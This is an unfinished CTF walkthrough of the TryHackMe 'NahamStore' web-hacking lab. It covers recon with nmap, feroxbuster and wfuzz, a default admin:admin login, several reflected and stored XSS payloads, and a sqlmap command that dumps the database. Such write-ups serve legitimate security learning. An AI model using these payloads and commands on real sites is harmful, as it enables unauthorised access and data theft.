---
title: NahamStore
date: 2023-02-28 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [security, web, bug bounty]
published: true
---

Learning the basics of bug bounty and web application hacking.

[NahamSec](https://twitter.com/nahamsec) set this room was setup to test what people learned on this [Udemy Course](http://bugbounty.nahamsec.training/) "Intro to Bug Bounty Hunting and Web Application Hacking". I havent done the course so going to try this for practice.

We need to start by modifying `/etc/hosts` and adding the domain.

```bash 
10.10.149.84    nahamstore.thm
```
{: file="/etc/hosts" }


## nmap Scans

Initial nmap scan we only have a couple open ports 22 ssh, and 80 webserver.

```shell
sudo nmap -p22,80,8000 nahamstore.thm -vvvv -sC -sV -O -oN nmap_services
```

## Enumeration

Seeing we find an open webserver - going to run `feroxbuser` for directories and files and `wfuzz` for subdomains in the background.

```bash
feroxbuster -u http://nahamstore.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -txt,php
```

Using wfuzz to scan for subdomains and filtering out 302 responses with 65 words

```bash
wfuzz -c -t 50 -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.nahamstore.thm" --hc 302 --hw 65
```

Found a few subdomains to check out

```shell
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://nahamstore.thm/
Total requests: 100000
=====================================================================
ID           Response   Lines    Word       Chars       Payload   
=====================================================================

000000001:   301        7 L      13 W       194 Ch      "www" 
000000013:   301        7 L      13 W       194 Ch      "shop"  
000000668:   200        41 L     92 W       2025 Ch     "marketing"  
000003809:   200        0 L      1 W        67 Ch       "stock"   
```

We can add these to `/etc/hosts` so we can access them for further enumeration. Our first task is to find Jimmy Jones SSN.

### Port 8000 

Seemed interesting and further enumeration there we find a login to the Marketing Manager.

- `http://nahamstore.thm:8000/admin/login` just using the creds admin:admin lets us login

## Recon




## XSS Vulnerabilities

### URL Endpoint vulnerable to XSS

URL encoded GET input error was set to `1'"()&%<script>g6VL(9778)</script>`

- `http://marketing.nahamstore.thm/ , error`

### Stored XSS

The User-Agent HTTP header can be used to create stored XSS

### Hidden parameter on the shop home page

URL encoded GET input q was set to 1"onmouseover=NmOf(9157)"

The input is reflected inside a tag parameter between double quotes. 

### Product Page HTML Tag

The vulnerability affects `http://nahamstore.thm/product` 

URL encoded GET input name was set to `Sticker Pack</title><ScRiPt >eM3M(9217)</ScRiPt>`



### Returns Page

- we can escape the textarea with `</textarea>` and `<script>alert()</script>`



## SQL Injection

using sqlmap we can dump the entire database

```shell
sqlmap -u http://nahamstore.thm/product?id=2 --batch --all
```

### Flag 1

![Flag 1](/assets/nahamstore01.png)






```

